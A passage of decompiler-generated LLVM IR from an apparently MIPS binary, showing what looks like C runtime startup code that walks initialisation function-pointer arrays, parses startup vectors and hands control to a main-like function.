  %v1_4066b0 = sdiv i32 %v2_4066a8, 4
  store i32 %v1_4066b0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4066b4

dec_label_pc_4066b4:                              ; preds = %dec_label_pc_4066b4, %dec_label_pc_406680
  %v0_4066b4 = phi i32 [ %v2_4066d4, %dec_label_pc_4066b4 ], [ %v3_4066a0, %dec_label_pc_406680 ]
  %v1_4066b4 = inttoptr i32 %v0_4066b4 to i32*
  %v2_4066b4 = load i32, i32* %v1_4066b4, align 4
  call void @__pseudo_call(i32 %v2_4066b4)
  %v0_4066c8 = load i32, i32* %s0.global-to-local, align 4
  %v1_4066c8 = add i32 %v0_4066c8, -1
  store i32 %v1_4066c8, i32* %s0.global-to-local, align 4
  %v3_4066cc = load i32, i32* @global_var_44920c, align 4
  %v1_4066d0 = mul i32 %v1_4066c8, 4
  %v2_4066d4 = add i32 %v3_4066cc, %v1_4066d0
  %v2_4066dc = icmp eq i32 %v0_4066c8, 0
  br i1 %v2_4066dc, label %dec_label_pc_4066e0, label %dec_label_pc_4066b4

dec_label_pc_4066e0:                              ; preds = %dec_label_pc_4066b4
  %v1_4066e4 = add i32 %v1_406688, 273296
  %v2_4066e4 = inttoptr i32 %v1_4066e4 to i32*
  %v3_4066e4 = load i32, i32* %v2_4066e4, align 4
  %v1_4066ec = inttoptr i32 %v3_4066e4 to i32*
  %v2_4066ec = load i32, i32* %v1_4066ec, align 4
  %v1_4066f4 = icmp eq i32 %v2_4066ec, 0
  br i1 %v1_4066f4, label %dec_label_pc_40670c, label %dec_label_pc_4066f8

dec_label_pc_4066f8:                              ; preds = %dec_label_pc_4066e0
  call void @__pseudo_call(i32 %v2_4066ec)
  br label %dec_label_pc_40670c

dec_label_pc_40670c:                              ; preds = %dec_label_pc_4066e0, %dec_label_pc_4066f8
  %v3_40670c = load i32, i32* bitcast (i32** @global_var_449214.361 to i32*), align 4
  %v1_40671c = icmp eq i32 %v3_40670c, 0
  br i1 %v1_40671c, label %dec_label_pc_40670c.dec_label_pc_406734_crit_edge, label %dec_label_pc_406720

dec_label_pc_40670c.dec_label_pc_406734_crit_edge: ; preds = %dec_label_pc_40670c
  br label %dec_label_pc_406734

dec_label_pc_406720:                              ; preds = %dec_label_pc_40670c
  store i32 %v0_406694, i32* %s0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_40670c)
  br label %dec_label_pc_406734

dec_label_pc_406734:                              ; preds = %dec_label_pc_40670c.dec_label_pc_406734_crit_edge, %dec_label_pc_406720
  ret i32 %v3_40670c

; uselistorder directives
  uselistorder i32 %v3_40670c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406734, { 1, 0 }
  uselistorder label %dec_label_pc_40670c, { 1, 0 }
}

define i32 @function_406744(i32 %arg1) local_unnamed_addr {
dec_label_pc_406744:
  ret i32 0
}

define i32 @function_40674c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40674c:
  %v1_40674c = load i32, i32* @v0, align 4
  ret i32 %v1_40674c
}

define i32 @function_406754(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406754:
  store i32 %arg1, i32* @a0, align 4
  %v3_406774 = load i32, i32* @global_var_4491fc.306, align 4
  store i32 %v3_406774, i32* @t9, align 4
  store i32 %arg2, i32* @s1, align 4
  store i32 1, i32* @a1, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_406780 = call i32 @function_404870()
  %v2_406790 = icmp eq i32 %v2_406780, -1
  br i1 %v2_406790, label %dec_label_pc_406794, label %dec_label_pc_4067c8

dec_label_pc_406794:                              ; preds = %dec_label_pc_406754
  %v3_40679c = load i32, i32* @global_var_4491f4.298, align 4
  store i32 %v3_40679c, i32* @t9, align 4
  %v1_4067a4 = load i32, i32* @s1, align 4
  store i32 %v1_4067a4, i32* @a1, align 4
  %v6_4067a4 = call i32 @function_404bb0(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_408a84.362, i32 0, i32 0))
  %v1_4067b0 = load i32, i32* @s0, align 4
  %v2_4067b0 = icmp eq i32 %v6_4067a4, %v1_4067b0
  br i1 %v2_4067b0, label %dec_label_pc_4067c8, label %dec_label_pc_4067b4

dec_label_pc_4067b4:                              ; preds = %dec_label_pc_406794
  %v3_4067b8 = load i32, i32* @global_var_449334.363, align 4
  store i32 %v3_4067b8, i32* @t9, align 4
  %v1_4067c0 = call i32 @function_407c70()
  br label %dec_label_pc_4067c8

dec_label_pc_4067c8:                              ; preds = %dec_label_pc_406754, %dec_label_pc_406794, %dec_label_pc_4067b4
  %v4_4067d4 = phi i32 [ %v2_406780, %dec_label_pc_406754 ], [ %v6_4067a4, %dec_label_pc_406794 ], [ %v1_4067c0, %dec_label_pc_4067b4 ]
  ret i32 %v4_4067d4

; uselistorder directives
  uselistorder i32 ()* @function_404870, { 7, 6, 1, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_4067c8, { 2, 1, 0 }
}

define i32 @function_4067dc() local_unnamed_addr {
dec_label_pc_4067dc:
  %v3_4067fc = load i32, i32* @global_var_449584.364, align 4
  %v1_406804 = icmp eq i32 %v3_4067fc, 0
  br i1 %v1_406804, label %dec_label_pc_406808, label %dec_label_pc_406858

dec_label_pc_406808:                              ; preds = %dec_label_pc_4067dc
  store i32 1, i32* @global_var_449584.364, align 4
  %v3_406810 = load i32, i32* bitcast (i32** @global_var_4492f4.324 to i32*), align 4
  %v2_406818 = inttoptr i32 %v3_406810 to i32*
  store i32 4096, i32* %v2_406818, align 4
  %v3_40681c = load i32, i32* @global_var_4493ac.365, align 4
  %v1_406824 = icmp eq i32 %v3_40681c, 0
  br i1 %v1_406824, label %dec_label_pc_40683c, label %dec_label_pc_406828

dec_label_pc_406828:                              ; preds = %dec_label_pc_406808
  %v1_40682c = call i32 @unknown_0()
  br label %dec_label_pc_40683c

dec_label_pc_40683c:                              ; preds = %dec_label_pc_406808, %dec_label_pc_406828
  %v3_40683c = load i32, i32* @global_var_4492d8.366, align 4
  %v1_406844 = icmp eq i32 %v3_40683c, 0
  br i1 %v1_406844, label %dec_label_pc_406858, label %dec_label_pc_406848

dec_label_pc_406848:                              ; preds = %dec_label_pc_40683c
  %v4_406850 = call i32 @unknown_0()
  br label %dec_label_pc_406858

dec_label_pc_406858:                              ; preds = %dec_label_pc_4067dc, %dec_label_pc_40683c, %dec_label_pc_406848
  %v4_406860 = phi i32 [ 1, %dec_label_pc_4067dc ], [ 0, %dec_label_pc_40683c ], [ %v4_406850, %dec_label_pc_406848 ]
  ret i32 %v4_406860

; uselistorder directives
  uselistorder label %dec_label_pc_406858, { 2, 1, 0 }
  uselistorder label %dec_label_pc_40683c, { 1, 0 }
}

define i32 @function_406868(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406868:
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-152 = alloca i32, align 4
  %v1_406870 = load i32, i32* @t9, align 4
  %v2_406870 = add i32 %v1_406870, 305512
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v1_406898 = mul i32 %arg2, 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  %v2_4068a4 = add i32 %tmp, %v1_406898
  store i32 %v2_4068a4, i32* %a2.global-to-local, align 4
  %v3_4068a8 = load i32, i32* bitcast (i32** @global_var_449494.367 to i32*), align 4
  %v3_4068ac = load i32, i32* bitcast (i32** @global_var_44942c.369 to i32*), align 4
  store i32 %v3_4068ac, i32* %s0.global-to-local, align 4
  %v2_4068b0 = inttoptr i32 %v3_4068a8 to i32*
  store i32 %arg7, i32* %v2_4068b0, align 4
  %v3_4068b4 = load i32, i32* bitcast (i32** @global_var_449214.361 to i32*), align 4
  store i32 %v3_4068b4, i32* %v0.global-to-local, align 4
  store i32 %arg6, i32* %v1.global-to-local, align 4
  %v0_4068c0 = load i32, i32* %a2.global-to-local, align 4
  %v1_4068c0 = add i32 %v0_4068c0, 4
  store i32 %v1_4068c0, i32* %a1.global-to-local, align 4
  %v2_4068c4 = inttoptr i32 %v3_4068b4 to i32*
  store i32 %arg6, i32* %v2_4068c4, align 4
  %v0_4068c8 = load i32, i32* %a1.global-to-local, align 4
  %v1_4068c8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4068c8 = inttoptr i32 %v1_4068c8 to i32*
  store i32 %v0_4068c8, i32* %v2_4068c8, align 4
  %v0_4068cc = load i32, i32* %s2.global-to-local, align 4
  %v1_4068cc = inttoptr i32 %v0_4068cc to i32*
  %v2_4068cc = load i32, i32* %v1_4068cc, align 4
  store i32 %v2_4068cc, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s5.global-to-local, align 4
  %v0_4068d4 = load i32, i32* %a1.global-to-local, align 4
  %v2_4068d4 = icmp eq i32 %v0_4068d4, %v2_4068cc
  store i32 %arg4, i32* %s3.global-to-local, align 4
  br i1 %v2_4068d4, label %dec_label_pc_4068d8, label %dec_label_pc_4068e0

dec_label_pc_4068d8:                              ; preds = %dec_label_pc_406868
  %v0_4068dc = load i32, i32* %a2.global-to-local, align 4
  %v1_4068dc = load i32, i32* %s0.global-to-local, align 4
  %v2_4068dc = inttoptr i32 %v1_4068dc to i32*
  store i32 %v0_4068dc, i32* %v2_4068dc, align 4
  br label %dec_label_pc_4068e0

dec_label_pc_4068e0:                              ; preds = %dec_label_pc_406868, %dec_label_pc_4068d8
  %v2_4068e4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 120, i32* %a2.global-to-local, align 4
  %v5_4068ec = call i32 @function_405520(i32* nonnull %stack_var_-152, i32 0, i32 120)
  store i32 %v5_4068ec, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v2_4068f8 = load i32, i32* bitcast (i32** @global_var_44942c.369 to i32*), align 4
  store i32 %v2_4068f8, i32* %v1.global-to-local, align 4
  %v0_406904.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_406904

dec_label_pc_406904:                              ; preds = %dec_label_pc_406904, %dec_label_pc_4068e0
  %v0_406904 = phi i32 [ %v3_406910, %dec_label_pc_406904 ], [ %v0_406904.pre, %dec_label_pc_4068e0 ]
  store i32 %v0_406904, i32* %v1.global-to-local, align 4
  %v1_406908 = inttoptr i32 %v0_406904 to i32*
  %v2_406908 = load i32, i32* %v1_406908, align 4
  store i32 %v2_406908, i32* %v0.global-to-local, align 4
  %v1_406910 = icmp eq i32 %v2_406908, 0
  %v3_406910 = add i32 %v0_406904, 4
  store i32 %v3_406910, i32* %a1.global-to-local, align 4
  br i1 %v1_406910, label %dec_label_pc_406914, label %dec_label_pc_406904

dec_label_pc_406914:                              ; preds = %dec_label_pc_406904
  store i32 %v3_406910, i32* @s0, align 4
  br label %dec_label_pc_406920

dec_label_pc_406920:                              ; preds = %dec_label_pc_406944, %dec_label_pc_406914
  %v0_406934 = phi i32 [ %v1_406944, %dec_label_pc_406944 ], [ %v3_406910, %dec_label_pc_406914 ]
  %v0_406920 = phi i32 [ %v4_406950, %dec_label_pc_406944 ], [ 0, %dec_label_pc_406914 ]
  %v1_406920 = icmp eq i32 %v0_406920, 0
  store i32 %v2_4068e4, i32* %v0.global-to-local, align 4
  br i1 %v1_406920, label %dec_label_pc_406944, label %dec_label_pc_406924

dec_label_pc_406924:                              ; preds = %dec_label_pc_406920
  %v0_40692c = load i32, i32* @a0, align 4
  %v1_40692c = mul i32 %v0_40692c, 8
  %v2_406930 = add i32 %v1_40692c, %v2_4068e4
  store i32 %v0_406934, i32* %a1.global-to-local, align 4
  store i32 8, i32* %a2.global-to-local, align 4
  %v4_406938 = inttoptr i32 %v0_406934 to i8*
  %v5_406938 = call i32 @function_407700(i32 %v2_406930, i8* %v4_406938, i32 8)
  store i32 %v5_406938, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v0_406944.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_406944

dec_label_pc_406944:                              ; preds = %dec_label_pc_406920, %dec_label_pc_406924
  %v0_406944 = phi i32 [ %v0_406934, %dec_label_pc_406920 ], [ %v0_406944.pre, %dec_label_pc_406924 ]
  %v1_406944 = add i32 %v0_406944, 8
  store i32 %v1_406944, i32* @s0, align 4
  %v1_406948 = inttoptr i32 %v1_406944 to i32*
  %v2_406948 = load i32, i32* %v1_406948, align 4
  store i32 %v2_406948, i32* @a0, align 4
  %v1_406950 = icmp eq i32 %v2_406948, 0
  %v3_406950 = icmp ult i32 %v2_406948, 15
  %v4_406950 = zext i1 %v3_406950 to i32
  store i32 %v4_406950, i32* %v0.global-to-local, align 4
  br i1 %v1_406950, label %dec_label_pc_406954, label %dec_label_pc_406920

dec_label_pc_406954:                              ; preds = %dec_label_pc_406944
  %v3_406958 = load i32, i32* @global_var_4492c8.371, align 4
  store i32 %v3_406958, i32* @t9, align 4
  %v5_406960 = call i32 @function_407e20(i32 %v2_4068e4)
  store i32 %v5_406960, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v3_406970 = load i32, i32* @global_var_449218.372, align 4
  store i32 %v3_406970, i32* @t9, align 4
  %v1_406978 = call i32 @function_4067dc()
  store i32 %v1_406978, i32* %v0.global-to-local, align 4
  store i32 %tmp27, i32* %v1.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v1_406988 = icmp eq i32 %tmp27, 0
  br i1 %v1_406988, label %dec_label_pc_40698c, label %dec_label_pc_406994

dec_label_pc_40698c:                              ; preds = %dec_label_pc_406954
  store i32 4096, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406994

dec_label_pc_406994:                              ; preds = %dec_label_pc_406954, %dec_label_pc_40698c
  %v0_40699c = phi i32 [ %tmp27, %dec_label_pc_406954 ], [ 4096, %dec_label_pc_40698c ]
  %v3_406994 = load i32, i32* bitcast (i32** @global_var_4492f4.324 to i32*), align 4
  store i32 -1, i32* %s1.global-to-local, align 4
  %v2_40699c = inttoptr i32 %v3_406994 to i32*
  store i32 %v0_40699c, i32* %v2_40699c, align 4
  store i32 %tmp26, i32* %v0.global-to-local, align 4
  %v1_4069a8 = load i32, i32* %s1.global-to-local, align 4
  %v2_4069a8 = icmp eq i32 %tmp26, %v1_4069a8
  br i1 %v2_4069a8, label %dec_label_pc_4069ac, label %dec_label_pc_406a18

dec_label_pc_4069ac:                              ; preds = %dec_label_pc_406994
  %v3_4069b0 = load i32, i32* @global_var_4492b4.373, align 4
  store i32 %v3_4069b0, i32* @t9, align 4
  %v1_4069b8 = call i32 @function_4071c0()
  store i32 %v1_4069b8, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v3_4069c8 = load i32, i32* @global_var_4492d4.374, align 4
  store i32 %v3_4069c8, i32* @t9, align 4
  store i32 %v1_4069b8, i32* @s0, align 4
  %v2_4069d0 = call i32 @function_407100()
  store i32 %v2_4069d0, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v0_4069dc = load i32, i32* @s0, align 4
  %v2_4069dc = icmp eq i32 %v0_4069dc, %v2_4069d0
  br i1 %v2_4069dc, label %dec_label_pc_4069e0, label %dec_label_pc_406a4c

dec_label_pc_4069e0:                              ; preds = %dec_label_pc_4069ac
  %v3_4069e4 = load i32, i32* @global_var_449418.375, align 4
  store i32 %v3_4069e4, i32* @t9, align 4
  %v1_4069ec = call i32 @function_407160()
  store i32 %v1_4069ec, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v3_4069fc = load i32, i32* @global_var_449374.376, align 4
  store i32 %v3_4069fc, i32* @t9, align 4
  store i32 %v1_4069ec, i32* @s0, align 4
  %v2_406a04 = call i32 @function_4070a0()
  store i32 %v2_406a04, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v0_406a10 = load i32, i32* @s0, align 4
  %v2_406a10 = icmp eq i32 %v0_406a10, %v2_406a04
  br i1 %v2_406a10, label %dec_label_pc_4069e0.dec_label_pc_406a18_crit_edge, label %dec_label_pc_406a4c

dec_label_pc_4069e0.dec_label_pc_406a18_crit_edge: ; preds = %dec_label_pc_4069e0
  %v1_406a20.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_406a18

dec_label_pc_406a18:                              ; preds = %dec_label_pc_4069e0.dec_label_pc_406a18_crit_edge, %dec_label_pc_406994
  %v1_406a20 = phi i32 [ %v1_406a20.pre, %dec_label_pc_4069e0.dec_label_pc_406a18_crit_edge ], [ %v1_4069a8, %dec_label_pc_406994 ]
  store i32 %tmp26, i32* %v1.global-to-local, align 4
  %v2_406a20 = icmp eq i32 %tmp26, %v1_406a20
  br i1 %v2_406a20, label %dec_label_pc_406a90, label %dec_label_pc_406a24

dec_label_pc_406a24:                              ; preds = %dec_label_pc_406a18
  store i32 %tmp25, i32* %v0.global-to-local, align 4
  %v2_406a30 = icmp eq i32 %tmp26, %tmp25
  br i1 %v2_406a30, label %dec_label_pc_406a34, label %dec_label_pc_406a4c

dec_label_pc_406a34:                              ; preds = %dec_label_pc_406a24
  store i32 %tmp24, i32* %v1.global-to-local, align 4
  store i32 %tmp23, i32* %v0.global-to-local, align 4
  %v2_406a44 = icmp eq i32 %tmp24, %tmp23
  br i1 %v2_406a44, label %dec_label_pc_406a90, label %dec_label_pc_406a4c

dec_label_pc_406a4c:                              ; preds = %dec_label_pc_406a34, %dec_label_pc_406a24, %dec_label_pc_4069e0, %dec_label_pc_4069ac
  %v0_406a4c = load i32, i32* %gp.global-to-local, align 4
  %v1_406a4c = add i32 %v0_406a4c, -32736
  %v2_406a4c = inttoptr i32 %v1_406a4c to i32*
  %v3_406a4c = load i32, i32* %v2_406a4c, align 4
  store i32 %v3_406a4c, i32* %v0.global-to-local, align 4
  %v1_406a54 = add i32 %v3_406a4c, 26452
  store i32 %v1_406a54, i32* %s1.global-to-local, align 4
  store i32 131072, i32* %a1.global-to-local, align 4
  store i32 131072, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406a54)
  store i32 131074, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406a54)
  store i32 131074, i32* %a1.global-to-local, align 4
  %v0_406a7c = load i32, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_406a7c)
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406a90

dec_label_pc_406a90:                              ; preds = %dec_label_pc_406a34, %dec_label_pc_406a18, %dec_label_pc_406a4c
  %v0_406a90 = load i32, i32* %gp.global-to-local, align 4
  %v1_406a90 = add i32 %v0_406a90, -32708
  %v2_406a90 = inttoptr i32 %v1_406a90 to i32*
  %v3_406a90 = load i32, i32* %v2_406a90, align 4
  store i32 %v3_406a90, i32* %v1.global-to-local, align 4
  %v3_406a94 = load i32, i32* %v2_406a90, align 4
  store i32 %v3_406a94, i32* %v0.global-to-local, align 4
  %v0_406a98 = load i32, i32* %s2.global-to-local, align 4
  %v1_406a98 = inttoptr i32 %v0_406a98 to i32*
  %v2_406a98 = load i32, i32* %v1_406a98, align 4
  %v2_406a9c = sub i32 %v3_406a94, %v3_406a90
  store i32 %v2_406a9c, i32* %v0.global-to-local, align 4
  %v1_406aa0 = sdiv i32 %v2_406a9c, 4
  store i32 %v1_406aa0, i32* %s1.global-to-local, align 4
  %v1_406aa4 = add i32 %v0_406a90, -32692
  %v2_406aa4 = inttoptr i32 %v1_406aa4 to i32*
  %v3_406aa4 = load i32, i32* %v2_406aa4, align 4
  store i32 %v3_406aa4, i32* %v0.global-to-local, align 4
  store i32 %arg5, i32* %v1.global-to-local, align 4
  %v2_406aac = inttoptr i32 %v3_406aa4 to i32*
  store i32 %v2_406a98, i32* %v2_406aac, align 4
  %v0_406ab0 = load i32, i32* %gp.global-to-local, align 4
  %v1_406ab0 = add i32 %v0_406ab0, -32704
  %v2_406ab0 = inttoptr i32 %v1_406ab0 to i32*
  %v3_406ab0 = load i32, i32* %v2_406ab0, align 4
  store i32 %v3_406ab0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  %v0_406abc = load i32, i32* %v1.global-to-local, align 4
  %v2_406abc = inttoptr i32 %v3_406ab0 to i32*
  store i32 %v0_406abc, i32* %v2_406abc, align 4
  %v0_406ac0.pre = load i32, i32* %gp.global-to-local, align 4
  %v0_406ac8.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_406ad4.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406ac0

dec_label_pc_406ac0:                              ; preds = %dec_label_pc_406ac0, %dec_label_pc_406a90
  %v1_406ad4 = phi i32 [ %v2_406ad4, %dec_label_pc_406ac0 ], [ %v1_406ad4.pre, %dec_label_pc_406a90 ]
  %v0_406ac8 = phi i32 [ %v3_406ae4, %dec_label_pc_406ac0 ], [ %v0_406ac8.pre, %dec_label_pc_406a90 ]
  %v0_406ac0 = phi i32 [ %v2_406870, %dec_label_pc_406ac0 ], [ %v0_406ac0.pre, %dec_label_pc_406a90 ]
  %v1_406ac0 = add i32 %v0_406ac0, -32708
  %v2_406ac0 = inttoptr i32 %v1_406ac0 to i32*
  %v3_406ac0 = load i32, i32* %v2_406ac0, align 4
  store i32 %v3_406ac0, i32* %v1.global-to-local, align 4
  %v2_406ac8 = add i32 %v3_406ac0, %v0_406ac8
  store i32 %v2_406ac8, i32* %v0.global-to-local, align 4
  %v1_406acc = inttoptr i32 %v2_406ac8 to i32*
  %v2_406acc = load i32, i32* %v1_406acc, align 4
  %v2_406ad4 = add i32 %v1_406ad4, 1
  store i32 %v2_406ad4, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_406acc)
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v1_406ae0 = load i32, i32* %s1.global-to-local, align 4
  %v2_406ae0 = icmp ult i32 %v2_406ad4, %v1_406ae0
  %v3_406ae4 = mul i32 %v2_406ad4, 4
  store i32 %v3_406ae4, i32* %v0.global-to-local, align 4
  br i1 %v2_406ae0, label %dec_label_pc_406ac0, label %dec_label_pc_406ae8

dec_label_pc_406ae8:                              ; preds = %dec_label_pc_406ac0
  %v0_406aec = load i32, i32* %s3.global-to-local, align 4
  %v1_406aec = icmp eq i32 %v0_406aec, 0
  br i1 %v1_406aec, label %dec_label_pc_406b04, label %dec_label_pc_406af0

dec_label_pc_406af0:                              ; preds = %dec_label_pc_406ae8
  call void @__pseudo_call(i32 %v0_406aec)
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406b04

dec_label_pc_406b04:                              ; preds = %dec_label_pc_406ae8, %dec_label_pc_406af0
  %v3_406b04 = load i32, i32* @global_var_44920c, align 4
  store i32 %v3_406b04, i32* %v1.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_406b1c = add i32 %v1_406870, 272804
  %v2_406b1c = inttoptr i32 %v1_406b1c to i32*
  br label %dec_label_pc_406b1c

dec_label_pc_406b1c:                              ; preds = %dec_label_pc_406b1c, %dec_label_pc_406b04
  %v1_406b30 = phi i32 [ %v2_406b30, %dec_label_pc_406b1c ], [ 0, %dec_label_pc_406b04 ]
  %v0_406b24 = phi i32 [ %v3_406b40, %dec_label_pc_406b1c ], [ 0, %dec_label_pc_406b04 ]
  %v3_406b1c = load i32, i32* %v2_406b1c, align 4
  store i32 %v3_406b1c, i32* %v1.global-to-local, align 4
  %v2_406b24 = add i32 %v3_406b1c, %v0_406b24
  store i32 %v2_406b24, i32* %v0.global-to-local, align 4
  %v1_406b28 = inttoptr i32 %v2_406b24 to i32*
  %v2_406b28 = load i32, i32* %v1_406b28, align 4
  %v2_406b30 = add i32 %v1_406b30, 1
  store i32 %v2_406b30, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_406b28)
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v1_406b3c = load i32, i32* %s1.global-to-local, align 4
  %v2_406b3c = icmp ult i32 %v2_406b30, %v1_406b3c
  %v3_406b40 = mul i32 %v2_406b30, 4
  store i32 %v3_406b40, i32* %v0.global-to-local, align 4
  br i1 %v2_406b3c, label %dec_label_pc_406b1c, label %dec_label_pc_406b44

dec_label_pc_406b44:                              ; preds = %dec_label_pc_406b1c
  %v3_406b48 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_406b48, i32* %v0.global-to-local, align 4
  %v1_406b50 = icmp eq i32 %v3_406b48, 0
  br i1 %v1_406b50, label %dec_label_pc_406b70, label %dec_label_pc_406b54

dec_label_pc_406b54:                              ; preds = %dec_label_pc_406b44
  store i32 %v3_406b48, i32* @t9, align 4
  %v1_406b60 = call i32 @function_405490()
  store i32 %v1_406b60, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v1_406b6c = inttoptr i32 %v1_406b60 to i32*
  store i32 0, i32* %v1_406b6c, align 4
  br label %dec_label_pc_406b70

dec_label_pc_406b70:                              ; preds = %dec_label_pc_406b44, %dec_label_pc_406b54
  %v3_406b70 = load i32, i32* @global_var_449328.383, align 4
  store i32 %v3_406b70, i32* %v0.global-to-local, align 4
  %v1_406b78 = icmp eq i32 %v3_406b70, 0
  br i1 %v1_406b78, label %dec_label_pc_406b98, label %dec_label_pc_406b7c

dec_label_pc_406b7c:                              ; preds = %dec_label_pc_406b70
  %v1_406b88 = call i32 @unknown_0()
  store i32 %v1_406b88, i32* %v0.global-to-local, align 4
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v1_406b94 = inttoptr i32 %v1_406b88 to i32*
  store i32 0, i32* %v1_406b94, align 4
  br label %dec_label_pc_406b98

dec_label_pc_406b98:                              ; preds = %dec_label_pc_406b70, %dec_label_pc_406b7c
  %v0_406b98 = load i32, i32* %gp.global-to-local, align 4
  %v1_406b98 = add i32 %v0_406b98, -32164
  %v2_406b98 = inttoptr i32 %v1_406b98 to i32*
  %v3_406b98 = load i32, i32* %v2_406b98, align 4
  store i32 %v3_406b98, i32* @v0, align 4
  %v1_406ba0 = inttoptr i32 %v3_406b98 to i32*
  %v2_406ba0 = load i32, i32* %v1_406ba0, align 4
  store i32 %v2_406ba0, i32* %a2.global-to-local, align 4
  %v0_406ba4 = load i32, i32* %s5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_406bb0.384 to i32), i32* @ra, align 4
  %v1_406ba8 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_406ba8, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_406ba4)
  store i32 %v2_406870, i32* %gp.global-to-local, align 4
  %v3_406bb8 = load i32, i32* @global_var_449220.385, align 4
  store i32 %v3_406bb8, i32* @t9, align 4
  %v1_406bc0 = load i32, i32* @v0, align 4
  %v3_406bc0 = call i32 @function_406350(i32 %v1_406bc0)
  store i32 %v3_406bc0, i32* %v0.global-to-local, align 4
  ret i32 %v3_406bc0

; uselistorder directives
  uselistorder i32 %v2_406b30, { 2, 0, 3, 1 }
  uselistorder i32 %v2_406ad4, { 2, 0, 3, 1 }
  uselistorder i32 %v4_406950, { 1, 0 }
  uselistorder i32 %v1_406944, { 1, 2, 0 }
  uselistorder i32 %v0_406934, { 0, 2, 1 }
  uselistorder i32 %v3_406910, { 0, 1, 3, 2 }
  uselistorder i32 %v0_406904, { 2, 1, 0 }
  uselistorder i32 %v2_4068e4, { 1, 0, 2 }
  uselistorder i32 %v2_406870, { 6, 5, 4, 7, 3, 8, 0, 2, 9, 10, 11, 12, 13, 14, 1, 15, 16 }
  uselistorder i32 %tmp27, { 0, 2, 1 }
  uselistorder i32 %tmp26, { 0, 4, 3, 2, 1 }
  uselistorder i32 %tmp25, { 1, 0 }
  uselistorder i32 %tmp24, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 2, 1, 17, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 22, 21, 23, 25, 24, 29, 26, 27, 28, 30, 31 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32* %gp.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 15, 12, 13, 7, 14, 8, 9, 10, 11, 16, 17, 18, 19, 20 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i32)* @function_406350, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 2, 1 }
  uselistorder i32 15, { 4, 0, 2, 5, 1, 6, 3, 7 }
